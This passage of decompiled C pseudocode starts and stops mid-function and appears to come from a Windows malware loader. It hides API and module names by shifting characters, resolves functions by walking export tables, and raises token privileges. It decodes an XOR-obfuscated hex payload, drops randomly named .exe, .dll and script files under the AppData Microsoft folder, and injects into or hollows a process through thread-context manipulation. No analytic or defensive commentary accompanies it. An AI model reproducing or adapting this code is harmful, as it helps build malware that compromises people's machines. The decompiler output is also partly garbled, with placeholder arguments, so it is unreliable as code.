    GetModuleFileNameA(NULL, (char *)&lpFilename, 200);
    int32_t v16; // 0x10005be0
    if ((char)lpFilename != 0) {
        int32_t v17 = &lpFilename; // 0x100062d0
        v17++;
        int32_t v18; // 0x10005be0
        int32_t v19 = (lpFilename & 255) != 92 ? v18 : v17;
        unsigned char v20 = *(char *)v17; // 0x100062de
        v18 = v19;
        v16 = v19;
        while (v20 != 0) {
            // 0x100062d6
            v17++;
            v19 = (int32_t)v20 != 92 ? v18 : v17;
            v20 = *(char *)v17;
            v18 = v19;
            v16 = v19;
        }
    }
    char v21 = *(char *)v16; // 0x100062e8
    if (v21 != 0) {
        int32_t v22 = v16; // 0x100062f4
        int32_t v23; // bp-486, 0x10005be0
        *(char *)((int32_t)&v23 - v16 + v22) = v21;
        v22++;
        char v24 = *(char *)v22; // 0x100062fc
        while (v24 != 0) {
            // 0x100062f6
            *(char *)((int32_t)&v23 - v16 + v22) = v24;
            v22++;
            v24 = *(char *)v22;
        }
    }
    // 0x10006302
    __asm_movdqu(0, __asm_movdqa_9(g23));
    lstrcpyW((int16_t *)101, (int16_t *)&g161);
    int32_t lpString; // bp-2112, 0x10005be0
    int32_t v25 = &lpString; // 0x1000633f
    int32_t v26 = v25; // 0x1000633f
    int32_t v27 = 0x7fffffff;
    while (*(int16_t *)v26 != 0) {
        int32_t v28 = v27 - 1; // 0x1000634e
        v26 += 2;
        if (v28 == 0) {
            goto lab_0x100063a5;
        }
        v27 = v28;
    }
    if (v27 != 0) {
        int32_t v29 = -2 - 2 * v27 + v25; // 0x10006366
        int32_t v30 = 0x7ffffffe; // 0x10006379
        int32_t v31 = v27;
        int32_t v32 = v29;
        int32_t v33; // 0x10005be0
        while (v30 != 0) {
            int16_t v34 = *(int16_t *)((int32_t)L" \"" - v29 + v32); // 0x10006384
            if (v34 == 0) {
                // break -> 0x10006399
                break;
            }
            // 0x1000638d
            *(int16_t *)v32 = v34;
            int32_t v35 = v32 + 2; // 0x10006391
            int32_t v36 = v31 - 1; // 0x10006394
            v30--;
            v33 = v35;
            if (v36 == 0) {
                goto lab_0x1000639d;
            }
            v31 = v36;
            v32 = v35;
        }
        // 0x10006399
        v33 = v32;
        int32_t v37 = v32; // 0x1000639b
        if (v31 == 0) {
          lab_0x1000639d:
            // 0x1000639d
            v37 = v33 - 2;
        }
        // 0x100063a0
        *(int16_t *)v37 = 0;
    }
  lab_0x100063a5:;
    int32_t v38 = lstrlenW((int16_t *)&lpString); // 0x100063b2
    int128_t v39 = __asm_movdqa_9(0x7300620076002e00730073005c); // 0x100063b4
    __asm_movdqu(0, v39);
    int16_t * lpBuffer = (int16_t *)(2 * v38 + v25); // 0x100063d2
    GetEnvironmentVariableW((int16_t *)&g120, lpBuffer, (int32_t)&g161);
    int128_t lpString2; // bp-912, 0x10005be0
    lstrcatW(lpBuffer, (int16_t *)&lpString2);
    int128_t v40 = __asm_xorps(v39, v39); // 0x100063f4
    int128_t lpStartupInfo; // bp-2216, 0x10005be0
    __asm_movdqu(lpStartupInfo, v40);
    lpStartupInfo = 68;
    int128_t v41; // 0x10005be0
    __asm_movdqu(v41, v40);
    int128_t v42; // 0x10005be0
    __asm_movdqu(v42, v40);
    int128_t v43; // 0x10005be0
    __asm_movdqu(v43, v40);
    int128_t lpProcessInformation; // bp-2144, 0x10005be0
    __asm_movdqu(lpProcessInformation, v40);
    int32_t v44; // 0x10005be0
    if (v44 == 1) {
        // 0x10006460
        return _40___security_check_cookie_40_4();
    }
    if (v44 == 2) {
        // 0x1000647b
        int32_t lpLibFileName; // 0x10005be0
        LoadLibraryW((int16_t *)lpLibFileName);
        // 0x10006460
        return _40___security_check_cookie_40_4();
    }
    if (v44 != 3) {
        // 0x10006460
        return _40___security_check_cookie_40_4();
    }
    int32_t * hFile = CreateFileW(lpBuffer, 0x40000000, 0, NULL, 2, 128, NULL); // 0x100064a1
    WriteFile(hFile, &lpBuffer2, 583, &lpNumberOfBytesWritten, NULL);
    CloseHandle(hFile);
    lstrlenW((int16_t *)&lpString);
    lstrcatW((int16_t *)&lpString, (int16_t *)&g13);
    CreateProcessW(NULL, (int16_t *)&lpString, NULL, NULL, false, 0x8000000, NULL, NULL, (struct _STARTUPINFOW *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10006530 - 0x10006ac4
int32_t function_10006530(void) {
    int128_t v1 = __asm_movq(0x33346d666f73666c); // 0x10006548
    int64_t v2; // bp-24, 0x10006530
    int32_t v3 = &v2; // 0x10006569
    int32_t v4 = v3; // bp-3896, 0x10006569
    int32_t v5 = &v4; // 0x10006569
    int64_t v6; // 0x10006530
    __asm_movq_10(0x100000000 * v6 / 0x100000000, v1);
    uint32_t v7 = lstrlenA((char *)&g161); // 0x1000657b
    int32_t v8 = v5; // 0x1000657f
    if (v7 >= 1) {
        int32_t v9 = v5; // 0x10006588
        int32_t v10 = 0; // 0x10006589
        int32_t v11; // bp-4, 0x10006530
        char * v12 = (char *)((int32_t)&v11 - 20 + v10); // 0x10006581
        *v12 = *v12 - 1;
        v9 -= 4;
        *(int32_t *)v9 = v3;
        v10++;
        uint32_t v13 = lstrlenA((char *)&g161); // 0x1000658a
        v8 = v9;
        while (v10 < v13) {
            // 0x10006581
            v12 = (char *)((int32_t)&v11 - 20 + v10);
            *v12 = *v12 - 1;
            v9 -= 4;
            *(int32_t *)v9 = v3;
            v10++;
            v13 = lstrlenA((char *)&g161);
            v8 = v9;
        }
    }
    int32_t * v14 = (int32_t *)(v8 - 4); // 0x10006590
    *v14 = 260;
    int32_t * v15 = (int32_t *)(v8 - 8); // 0x1000659b
    *v15 = 0;
    int32_t * v16 = (int32_t *)(v8 - 12); // 0x1000659d
    int32_t v17; // bp-756, 0x10006530
    int32_t v18 = &v17; // 0x1000659d
    *v16 = v18;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    int32_t * v19 = (int32_t *)(v8 - 16); // 0x100065a3
    *v19 = 260;
    int32_t * v20 = (int32_t *)(v8 - 20); // 0x100065ae
    *v20 = 0;
    int32_t * v21 = (int32_t *)(v8 - 24); // 0x100065b0
    int128_t v22; // bp-1020, 0x10006530
    int32_t v23 = &v22; // 0x100065b0
    *v21 = v23;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    *v14 = v3;
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&g161); // 0x100065c3
    v17 = 0x64616f4c;
    int32_t v24 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x100065f9
    *v15 = v18;
    *v16 = moduleHandle;
    int32_t v25 = function_10007210(v17, (char *)0x7262694c); // 0x10006605
    int128_t v26 = __asm_movdqa_9(g42); // 0x10006610
    uint16_t v27 = *(int16_t *)(2 * v25 + moduleHandle + *(int32_t *)(v24 + 36)); // 0x1000661b
    int32_t v28 = *(int32_t *)(*(int32_t *)(v24 + 28) + moduleHandle + 4 * (int32_t)v27); // 0x10006625
    int32_t v29 = v28 + moduleHandle; // 0x1000662b
    *v15 = v3;
    g137 = v29;
    __asm_movdqu(0, v26);
    *v16 = v23;
    *v19 = v29;
    function_10007210((int32_t)&g161, (char *)&g161);
    *v20 = 99;
    *v21 = 0;
    int32_t * v30 = (int32_t *)(v8 - 28); // 0x10006669
    int32_t v31; // bp-131, 0x10006530
    *v30 = (int32_t)&v31;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    char * lpModuleName = (char *)0x6e72656b; // bp-132, 0x10006672
    int32_t v32 = (int32_t)&lpModuleName; // 0x1000668e
    *v16 = v32;
    int32_t moduleHandle2 = (int32_t)GetModuleHandleA(lpModuleName); // 0x1000668f
    int128_t v33 = 0x64616f4c; // bp-332, 0x10006693
    int32_t v34 = *(int32_t *)(moduleHandle2 + 120 + *(int32_t *)(moduleHandle2 + 60)) + moduleHandle2; // 0x100066c5
    *v19 = (int32_t)&v33;
    *v20 = moduleHandle2;
    int32_t v35 = function_10007210((int32_t)v33, (char *)0x7262694c); // 0x100066d1
    uint16_t v36 = *(int16_t *)(2 * v35 + moduleHandle2 + *(int32_t *)(v34 + 36)); // 0x100066df
    int32_t v37 = *(int32_t *)(*(int32_t *)(v34 + 28) + moduleHandle2 + 4 * (int32_t)v36); // 0x100066e9
    int32_t v38 = v37 + moduleHandle2; // 0x100066ef
    *v19 = v32;
    g137 = v38;
    *v20 = 99;
    *v21 = 0;
    int32_t v39; // bp-435, 0x10006530
    *v30 = (int32_t)&v39;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    char * lpString1 = (char *)0x6e65704f; // bp-436, 0x1000670b
    int32_t v40 = *(int32_t *)(v38 + 120 + *(int32_t *)(v38 + 60)) + v38; // 0x10006736
    int32_t * v41 = (int32_t *)(v8 - 32); // 0x10006738
    int32_t v42 = (int32_t)&lpString1; // 0x10006738
    *v41 = v42;
    int32_t * v43 = (int32_t *)(v8 - 36); // 0x10006739
    *v43 = v38;
    int32_t v44 = function_10007210((int32_t)lpString1, (char *)0x636f7250); // 0x10006742
    uint16_t v45 = *(int16_t *)(2 * v44 + v38 + *(int32_t *)(v40 + 36)); // 0x10006750
    int32_t v46 = *(int32_t *)(*(int32_t *)(v40 + 28) + v38 + 4 * (int32_t)v45); // 0x1000675a
    lpModuleName = (char *)0x6e72656b;
    *v20 = v32;
    GetModuleHandleA((char *)(v46 + v38));
    v33 = 0x64616f4c;
    g137 = function_100058f0();
    *v21 = v32;
    int32_t lpModuleName2 = function_100058f0(); // 0x100067c8
    *v30 = v32;
    lpModuleName = (char *)0x6e72656b;
    GetModuleHandleA((char *)lpModuleName2);
    v33 = 0x64616f4c;
    g137 = function_100058f0();
    *v41 = v32;
    function_100058f0();
    *v43 = v3;
    GetModuleHandleA((char *)&g161);
    v33 = 0x74726956;
    function_100058f0();
    __asm_movdqu(0, __asm_movdqa_9(0x6f6d654d737365636f72506574697257));
    function_100058f0();
    int128_t v47 = __asm_movdqa_9(g55); // 0x100068af
    int128_t v48; // bp-488, 0x10006530
    __asm_movdqu(v48, v47);
    int32_t v49 = 0; // bp-3764, 0x100068cb
    int128_t v50 = __asm_xorps(v47, v47); // 0x100068d5
    *(int32_t *)(v8 - 40) = (int32_t)&v49;
    *(int32_t *)(v8 - 44) = 32;
    int128_t v51; // bp-3804, 0x10006530
    __asm_movdqu(v51, v50);
    int128_t v52; // bp-3876, 0x10006530
    __asm_movdqu(v52, v50);
    int128_t v53; // 0x10006530
    __asm_movdqu(v53, v50);
    int128_t v54; // 0x10006530
    __asm_movdqu(v54, v50);
    int128_t v55; // 0x10006530
    __asm_movdqu(v55, v50);
    *(int32_t *)(v8 - 48) = (int32_t)GetCurrentProcess();
    OpenProcessToken(&g161, (int32_t)&g161, (int32_t **)&g161);
    bool DisableAllPrivileges; // bp-3788, 0x10006530
    *(int32_t *)(v8 - 52) = (int32_t)&DisableAllPrivileges;
    *(int32_t *)(v8 - 56) = (int32_t)&v48;
    *(int32_t *)(v8 - 60) = 0;
    LookupPrivilegeValueA((char *)&g161, (char *)&g161, (struct _LUID *)&g161);
    *(int32_t *)(v8 - 64) = 0;
    *(int32_t *)(v8 - 68) = 0;
    *(int32_t *)(v8 - 72) = 16;
    int32_t v56; // bp-3036, 0x10006530
    *(int32_t *)(v8 - 76) = (int32_t)&v56;
    *(int32_t *)(v8 - 80) = 0;
    *(int32_t *)(v8 - 84) = v49;
    v56 = 1;
    struct _TOKEN_PRIVILEGES * NewState; // 0x10006530
    AdjustTokenPrivileges((int32_t *)1, DisableAllPrivileges, NewState, 2, (struct _TOKEN_PRIVILEGES *)&g161, &g161);
    *(int32_t *)(v8 - 88) = 1000;
    int32_t v57; // bp-2020, 0x10006530
    int32_t v58 = &v57; // 0x10006989
    *(int32_t *)(v8 - 92) = v58;
    *(int32_t *)(v8 - 96) = (int32_t)"appdata";
    lpString1 = (char *)0x63694d5c;
    *(int32_t *)(v8 - 100) = v42;
    *(int32_t *)(v8 - 104) = v58;
    lstrcatA(lpString1, (char *)0x6f736f72);
    *(int32_t *)(v8 - 108) = 1000;
    int32_t v59; // bp-3020, 0x10006530
    int32_t v60 = &v59; // 0x100069ce
    *(int32_t *)(v8 - 112) = v60;
    *(int32_t *)(v8 - 116) = 0;
    GetModuleFileNameA(&g161, (char *)&g161, (int32_t)&g161);
    *(int32_t *)(v8 - 120) = (int32_t)&v51;
    *(int32_t *)(v8 - 124) = (int32_t)&v52;
    *(int32_t *)(v8 - 128) = v58;
    *(int32_t *)(v8 - 132) = 0;
    *(int32_t *)(v8 - 136) = 0x8000004;
    *(int32_t *)(v8 - 140) = 0;
    *(int32_t *)(v8 - 144) = 0;
    *(int32_t *)(v8 - 148) = 0;
    *(int32_t *)(v8 - 152) = v60;
    *(int32_t *)(v8 - 156) = 0;
    *(int32_t *)(v8 - 160) = 3000;
    Sleep((int32_t)&g161);
    *(int32_t *)(v8 - 168) = 0;
    *(int32_t *)(v8 - 172) = 1082;
    *(int32_t *)(v8 - 176) = 64;
    *(int32_t *)(v8 - 180) = 0x1000;
    *(int32_t *)(v8 - 188) = 0;
    *(int32_t *)(v8 - 192) = (int32_t)&g161;
    *(int32_t *)(v8 - 196) = 0;
    *(int32_t *)(v8 - 208) = (int32_t)&g161;
    *(int32_t *)(v8 - 212) = (int32_t)&g161;
    struct _CONTEXT * lpContext = (struct _CONTEXT *)0x10001; // bp-3756, 0x10006a75
    int32_t v61 = (int32_t)&lpContext; // 0x10006a7f
    *(int32_t *)(v8 - 216) = v61;
    GetThreadContext(&g161, lpContext);
    *(int32_t *)(v8 - 224) = v61;
    SetThreadContext(&g161, (struct _CONTEXT *)&g161);
    ResumeThread(&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10006ad0 - 0x10007208
int32_t function_10006ad0(int32_t a1) {
    int128_t v1 = __asm_movq(0x33346d666f73666c); // 0x10006ae6
    int64_t v2; // bp-56, 0x10006ad0
    int32_t v3 = &v2; // 0x10006b12
    int32_t v4 = v3; // bp-956, 0x10006b12
    int32_t v5 = &v4; // 0x10006b12
    int64_t v6; // 0x10006ad0
    __asm_movq_10(0x100000000 * v6 / 0x100000000, v1);
    uint32_t v7 = lstrlenA((char *)&g161); // 0x10006b24
    int32_t v8 = v5; // 0x10006b28
    if (v7 >= 1) {
        int32_t v9 = v5; // 0x10006b37
        int32_t v10 = 0; // 0x10006b38
        int32_t v11; // bp-4, 0x10006ad0
        char * v12 = (char *)((int32_t)&v11 - 52 + v10); // 0x10006b30
        *v12 = *v12 - 1;
        v9 -= 4;
        *(int32_t *)v9 = v3;
        v10++;
        uint32_t v13 = lstrlenA((char *)&g161); // 0x10006b39
        v8 = v9;
        while (v10 < v13) {
            // 0x10006b30
            v12 = (char *)((int32_t)&v11 - 52 + v10);
            *v12 = *v12 - 1;
            v9 -= 4;
            *(int32_t *)v9 = v3;
            v10++;
            v13 = lstrlenA((char *)&g161);
            v8 = v9;
        }
    }
    int32_t * v14 = (int32_t *)(v8 - 4); // 0x10006b3f
    *v14 = 260;
    int32_t * v15 = (int32_t *)(v8 - 8); // 0x10006b4a
    *v15 = 0;
    int32_t * v16 = (int32_t *)(v8 - 12); // 0x10006b4c
    int32_t v17; // bp-632, 0x10006ad0
    int32_t v18 = &v17; // 0x10006b4c
    *v16 = v18;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    *v14 = 260;
    *v15 = 0;
    int128_t v19; // bp-896, 0x10006ad0
    int32_t v20 = &v19; // 0x10006b62
    *v16 = v20;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    *v14 = v3;
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&g161); // 0x10006b75
    v17 = 0x64616f4c;
    int32_t v21 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x10006bab
    *v15 = v18;
    *v16 = moduleHandle;
    int32_t v22 = function_10007210(v17, (char *)0x7262694c); // 0x10006bb7
    int128_t v23 = __asm_movdqa_9(g51); // 0x10006bc2
    uint16_t v24 = *(int16_t *)(2 * v22 + moduleHandle + *(int32_t *)(v21 + 36)); // 0x10006bcd
    int32_t v25 = *(int32_t *)(*(int32_t *)(v21 + 28) + moduleHandle + 4 * (int32_t)v24); // 0x10006bd7
    int32_t v26 = v25 + moduleHandle; // 0x10006bdd
    *v15 = v3;
    g137 = v26;
    __asm_movdqu(0, v23);
    *v16 = v20;
    int32_t * v27 = (int32_t *)(v8 - 16); // 0x10006bff
    *v27 = v26;
    int32_t * v28 = (int32_t *)(v26 + 60); // 0x10006c06
    int32_t v29 = v26 + 120;
    int32_t v30 = *(int32_t *)(*v28 + v29) + v26; // 0x10006c11
    int32_t v31 = function_10007210(v26, (char *)&g161); // 0x10006c18
    int32_t * v32 = (int32_t *)(v8 - 20); // 0x10006c20
    *v32 = (int32_t)"FreeLibrary";
    int32_t * v33 = (int32_t *)(v8 - 24); // 0x10006c25
    *v33 = v26;
    uint16_t v34 = *(int16_t *)(2 * v31 + v26 + *(int32_t *)(v30 + 36)); // 0x10006c29
    int32_t v35 = *(int32_t *)(*(int32_t *)(v30 + 28) + v26 + 4 * (int32_t)v34); // 0x10006c33
    int32_t v36 = *(int32_t *)(*v28 + v29) + v26; // 0x10006c45
    int32_t v37 = function_10007210(v35 + v26, (char *)&g161); // 0x10006c4f
    uint16_t v38 = *(int16_t *)(2 * v37 + v26 + *(int32_t *)(v36 + 36)); // 0x10006c5a
    int32_t v39 = *(int32_t *)(*(int32_t *)(v36 + 28) + v26 + 4 * (int32_t)v38); // 0x10006c64
    int32_t * v40 = (int32_t *)(v8 - 28); // 0x10006c69
    *v40 = 99;
    int32_t * v41 = (int32_t *)(v8 - 32); // 0x10006c77
    *v41 = 0;
    int32_t * v42 = (int32_t *)(v8 - 36); // 0x10006c79
    int32_t v43; // bp-263, 0x10006ad0
    *v42 = (int32_t)&v43;
    _memset((int32_t *)(v39 + v26), (int32_t)&g161, (int32_t)&g161);
    int32_t * v44 = NULL; // bp-160, 0x10006c82
    *v16 = 99;
    *v27 = 0;
    int32_t v45; // bp-159, 0x10006ad0
    *v32 = (int32_t)&v45;
    _memset(v44, (int32_t)&g161, (int32_t)&g161);
    char * lpModuleName = (char *)0x6e72656b; // bp-264, 0x10006c9c
    int32_t v46 = (int32_t)&lpModuleName; // 0x10006cc7
    *v16 = v46;
    int32_t moduleHandle2 = (int32_t)GetModuleHandleA(lpModuleName); // 0x10006cc8
    v44 = (int32_t *)76;
    int32_t v47 = *(int32_t *)(moduleHandle2 + 120 + *(int32_t *)(moduleHandle2 + 60)) + moduleHandle2; // 0x10006cfe
    int32_t v48 = (int32_t)&v44; // 0x10006d00
    *v27 = v48;
    *v32 = moduleHandle2;
    int32_t v49 = function_10007210(0x1000000 * (int32_t)v44 / 0x1000000, (char *)0x7262694c); // 0x10006d0a
    uint16_t v50 = *(int16_t *)(2 * v49 + moduleHandle2 + *(int32_t *)(v47 + 36)); // 0x10006d18
    int32_t v51 = *(int32_t *)(*(int32_t *)(v47 + 28) + moduleHandle2 + 4 * (int32_t)v50); // 0x10006d22
    *v27 = v46;
    g137 = v51 + moduleHandle2;
    v17 = 0x61636f4c;
    int32_t v52 = *(int32_t *)(*v28 + v29) + v26; // 0x10006d65
    *v32 = v48;
    *v33 = v26;
    int32_t v53 = function_10007210(v17, (char *)0x6572466c); // 0x10006d71
    *v32 = 0;
    uint16_t v54 = *(int16_t *)(2 * v53 + v26 + *(int32_t *)(v52 + 36)); // 0x10006d81
    *v33 = 128;
    *v40 = 4;
    *v41 = 0;
    int32_t v55 = *(int32_t *)(*(int32_t *)(v52 + 28) + v26 + 4 * (int32_t)v54); // 0x10006d94
    *v42 = 0;
    *(int32_t *)(v8 - 40) = -0x80000000;
    int32_t * v56 = CreateFileW((int16_t *)(v55 + v26), (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10006dac
    int32_t v57 = (int32_t)v56; // 0x10006dac
    int32_t v58; // bp-924, 0x10006ad0
    int32_t v59 = &v58; // 0x10006dba
    *(int32_t *)(v8 - 48) = v59;
    *(int32_t *)(v8 - 52) = v57;
    int32_t uFlags = GetFileSize(&g161, &g161);
    *(int32_t *)(v8 - 56) = uFlags;
    *(int32_t *)(v8 - 60) = 64;
    int32_t v60 = uFlags; // bp-908, 0x10006dcb
    int32_t memoryHandle = (int32_t)LocalAlloc(uFlags, (int32_t)&g161); // 0x10006dd1
    *(int32_t *)(v8 - 64) = uFlags;
    *(int32_t *)(v8 - 68) = 64;
    int32_t * memoryHandle2 = LocalAlloc(memoryHandle, (int32_t)&g161); // 0x10006de1
    *(int32_t *)(v8 - 72) = 0;
    int32_t hFile = 0x6d005c; // bp-368, 0x10006df3
    *(int32_t *)(v8 - 76) = v59;
    *(int32_t *)(v8 - 80) = v60;
    *(int32_t *)(v8 - 84) = memoryHandle;
    *(int32_t *)(v8 - 88) = v57;
    ReadFile((int32_t *)hFile, (int32_t *)0x6c006d, 110, &g161, (struct _OVERLAPPED *)&g161);
    *(int32_t *)(v8 - 92) = v57;
    CloseHandle(&g161);
    if (v60 == 0) {
        // 0x10006e30
        return _40___security_check_cookie_40_4();
    }
    int32_t v61 = (int32_t)memoryHandle2; // 0x10006de1
    char * v62 = (char *)0xa0d0a0d; // bp-20, 0x10006e46
    *(int32_t *)(v8 - 96) = (int32_t)&v62;
    *(int32_t *)(v8 - 100) = memoryHandle;
    StrStrIA(v62, NULL);
    int32_t v63 = function_10005930(); // 0x10006e68
    int32_t v64 = v63 - (v63 >> 31); // 0x10006e73
    int32_t v65 = v64 / 2; // 0x10006e77
    int32_t v66 = 0; // 0x10006e7f
    if (v64 >= 2) {
        int32_t v67 = 2 * v66 + v61;
        char v68 = *(char *)v67; // 0x10006e81
        char v69 = v68 - 48;
        char v70 = v69; // 0x10006e89
        if (v69 >= 10) {
            if (v68 < 71) {
                // 0x10006e9a
                v70 = v68 - 55;
            } else {
                // 0x10006ea2
                v70 = v68 < 103 ? v68 - 87 : 0;
            }
        }
        char v71 = *(char *)(v67 + 1); // 0x10006eb3
        char v72 = v71 - 48;
        char v73 = v72; // 0x10006ebd
        if (v72 >= 10) {
            if (v71 < 71) {
                // 0x10006ecf
                v73 = v71 - 55;
            } else {
                // 0x10006ed7
                v73 = v71 < 103 ? v71 - 87 : 0;
            }
        }
        unsigned char v74 = v73 + 16 * v70 ^ 35; // 0x10006ef0
        *(char *)(v66 + v61) = v74 / 32 | 8 * v74;
        v66++;
        while (v66 != v65) {
            // 0x10006e81
            v67 = 2 * v66 + v61;
            v68 = *(char *)v67;
            v69 = v68 - 48;
            v70 = v69;
            if (v69 >= 10) {
                if (v68 < 71) {
                    // 0x10006e9a
                    v70 = v68 - 55;
                } else {
                    // 0x10006ea2
                    v70 = v68 < 103 ? v68 - 87 : 0;
                }
            }
            // 0x10006eb3
            v71 = *(char *)(v67 + 1);
            v72 = v71 - 48;
            v73 = v72;
            if (v72 >= 10) {
                if (v71 < 71) {
                    // 0x10006ecf
                    v73 = v71 - 55;
                } else {
                    // 0x10006ed7
                    v73 = v71 < 103 ? v71 - 87 : 0;
                }
            }
            // 0x10006ee9
            v74 = v73 + 16 * v70 ^ 35;
            *(char *)(v66 + v61) = v74 / 32 | 8 * v74;
            v66++;
        }
    }
    int32_t v75 = v8 - 104;
    int32_t v76; // 0x10006ad0
    if (v76 == 0) {
        // 0x100071b1
        *(int32_t *)v75 = 4;
        *(int32_t *)(v8 - 108) = 0x3000;
        int32_t v77 = v65 + 10; // 0x100071b8
        *(int32_t *)(v8 - 112) = v77;
        int32_t v78 = v8 - 116; // 0x100071bc
        *(int32_t *)v78 = 0;
        if (v64 >= 2) {
            int32_t v79 = v65; // 0x100071ce
            int32_t v80 = v77;
            *(char *)v80 = *(char *)(v61 - 10 - v65 + v80);
            v79--;
            int32_t v81 = v80 + 1; // 0x100071da
            while (v79 != 0) {
                // 0x100071d0
                v80 = v81;
                *(char *)v80 = *(char *)(v61 - 10 - v65 + v80);
                v79--;
                v81 = v80 + 1;
            }
        }
        // 0x100071dc
        function_10006530();
        // 0x100071e5
        *(int32_t *)(v78 - 4) = memoryHandle;
        return _40___security_check_cookie_40_4();
    }
    int32_t v82 = lstrlenW((int16_t *)&g161); // 0x10006f10
    int32_t v83; // 0x10006ad0
    int32_t v84; // 0x10006ad0
    int16_t * lpString1; // bp-40, 0x10006ad0
    if (v76 == 3) {
        goto lab_0x1000713c;
    } else {
        // 0x10006f6b
        int32_t v85; // 0x10006ad0
        int32_t v86 = 2 * v82 + v85; // 0x10006f16
        *(char *)v86 = (char)(GetTickCount() % 26) + 97;
        *(char *)(v86 + 1) = 0;
        *(char *)(v86 + 2) = (char)(GetTickCount() % 26) + 65;
        *(int16_t *)(v86 + 3) = 0;
        *(char *)(v86 + 5) = 0;
        if (v76 != 1) {
            // 0x10007027
            v83 = 26;
            v84 = v75;
            if (v76 == 2) {
                char * v87 = (char *)(v61 + 50); // 0x10007030
                int32_t v88 = 26; // 0x10007034
                int32_t v89 = v75; // 0x10007034
                if (*v87 != 0) {
                    // 0x1000703a
                    *(int32_t *)(v8 - 108) = 512;
                    *(int32_t *)(v8 - 116) = (int32_t)&g120;
                    GetEnvironmentVariableW((int16_t *)&g161, (int16_t *)&g161, (int32_t)&g161);
                    int32_t v90 = lstrlenW((int16_t *)&g161); // 0x10007052
                    *(int32_t *)(v8 - 124) = (int32_t)&g132;
                    *(int32_t *)(2 * v90 + v85) = 92;
                    lstrcatW((int16_t *)&g161, (int16_t *)&g161);
                    *(int32_t *)(v8 - 132) = (int32_t)&hFile;
                    lstrcatW((int16_t *)&g161, (int16_t *)&g161);
                    unsigned char v91 = *v87; // 0x10007075
                    int32_t lpString = v91; // 0x10007075
                    int32_t v92 = v8 - 140; // 0x10007079
                    int32_t v93 = 2 * lstrlenW((int16_t *)lpString) + v85; // 0x10007088
                    if (v91 > 9) {
                        // 0x100070a1
                        v88 = lpString;
                        v89 = v92;
                        if (v91 <= 99) {
                            // 0x100070a6
                            *(char *)(v93 + 1) = 0;
                            *(int16_t *)(v93 + 3) = 0;
                            *(char *)(v93 + 5) = 0;
                            int32_t v94 = lpString + 48 + -10 * (int32_t)(v91 / 10); // 0x100070db
                            *(char *)(v93 + 2) = (char)v94;
                            v88 = v94 & 255;
                            v89 = v92;
                        }
                    } else {
                        unsigned char v95 = v91 + 48; // 0x10007090
                        *(int16_t *)(v93 + 1) = 0;
                        *(char *)v93 = v95;
                        *(char *)(v93 + 3) = 0;
                        v88 = v95;
                        v89 = v92;
                    }
                }
                // 0x100070e1
                lpString1 = (int16_t *)0x64002e;
                *(int32_t *)(v89 - 4) = (int32_t)&lpString1;
                lstrcatW(lpString1, (int16_t *)0x6c006c);
                *(int32_t *)(v89 - 12) = 0;
                *(int32_t *)(v89 - 16) = 128;
                *(int32_t *)(v89 - 20) = 2;
                *(int32_t *)(v89 - 24) = 0;
                *(int32_t *)(v89 - 28) = 0;
                *(int32_t *)(v89 - 32) = 0x40000000;
                int32_t * v96 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10007113
                int32_t v97 = (int32_t)v96; // 0x10007113
                int32_t v98 = v89 - 36; // 0x1000711e
                if (v96 == (int32_t *)-1) {
                    // 0x10007120
                    v98 = v89 - 44;
                    *(int32_t *)v98 = v97;
                }
                int32_t v99 = v98 - 4; // 0x1000712e
                *(int32_t *)v99 = v97;
                CloseHandle(&g161);
                v83 = v88;
                v84 = v99;
            }
            goto lab_0x10007160;
        } else {
            char * v100 = (char *)(v61 + 1000); // 0x10006f74
            if (*v100 == 0) {
                goto lab_0x1000713c;
            } else {
                // 0x10006f81
                *(int32_t *)(v8 - 108) = 512;
                *(int32_t *)(v8 - 116) = (int32_t)&g120;
                GetEnvironmentVariableW((int16_t *)&g161, (int16_t *)&g161, (int32_t)&g161);
                int32_t v101 = lstrlenW((int16_t *)&g161); // 0x10006f93
                *(int32_t *)(v8 - 124) = (int32_t)&g132;
                *(int32_t *)(2 * v101 + v85) = 92;
                lstrcatW((int16_t *)&g161, (int16_t *)&g161);
                *(int32_t *)(v8 - 132) = (int32_t)&hFile;
                lstrcatW((int16_t *)&g161, (int16_t *)&g161);
                int32_t v102 = 2 * lstrlenW((int16_t *)&g161) + v85; // 0x10006fbf
                *(char *)(v102 + 1) = 0;
                *(char *)v102 = (*v100 & 15) + 97;
                *(int16_t *)(v102 + 3) = 0;
                *(char *)(v102 + 2) = *v100 / 16 + 65;
                *(char *)(v102 + 5) = 0;
                *(int32_t *)(v8 - 144) = (int32_t)&lpString1;
                lpString1 = (int16_t *)0x65002e;
                lstrcatW((int16_t *)0x65002e, (int16_t *)0x650078);
                v83 = 120;
                v84 = v8 - 148;
                goto lab_0x10007160;
            }
        }
    }
  lab_0x1000713c:
    // 0x1000713c
    lpString1 = (int16_t *)0x65002e;
    *(int32_t *)(v8 - 108) = (int32_t)&lpString1;
    lstrcatW(lpString1, (int16_t *)0x650078);
    v83 = 120;
    v84 = v8 - 112;
    goto lab_0x10007160;
  lab_0x10007160:
    // 0x10007160
    *(int32_t *)(v84 - 4) = 0;
    *(int32_t *)(v84 - 8) = 128;
    *(int32_t *)(v84 - 12) = 2;
    *(int32_t *)(v84 - 16) = 0;
    *(int32_t *)(v84 - 20) = 0;
    *(int32_t *)(v84 - 24) = 0x40000000;
